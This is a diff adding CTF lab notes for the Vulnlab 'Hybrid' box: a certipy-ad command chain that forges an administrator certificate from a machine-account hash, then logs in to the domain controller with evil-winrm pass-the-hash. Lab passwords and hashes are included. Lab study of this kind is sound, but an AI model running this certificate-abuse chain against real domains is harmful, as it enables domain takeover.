@@ -180,8 +180,21 @@ ntpdate -u sequel.htb
 
 certipy-ad auth -pfx administrator.pfx
 
+### Hybrid Box on Vulnlab
+### Similiar attack, but keep it mind isn't perfect, had issues where this just wasn't working, had to revert box before it went through
+###  https://procoder.in/2023/08/17/hybrid-vulnlab/
+
+certipy-ad find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.186.213
+
+python3 keytabextract.py krb5.keytab
 
 
+certipy-ad req -u 'MAIL01$'@hybrid.vl -hashes 0f916c5246fdbc7ba95dcef4126d57bd -c 'hybrid-DC01-CA' -target 'hybrid.vl' -template 'HybridComputers' -upn 'administrator@hybrid.vl' -dns 'dc01.hybrid.vl' -key-size 4096 -debug
+
+certipy-ad auth -pfx administrator_dc01.pfx -dc-ip 10.10.186.213
+
+
+evil-winrm -u administrator -H 60701e8543c9f6db1a2af3217386d3dc -i 10.10.186.213
 
 ```
 
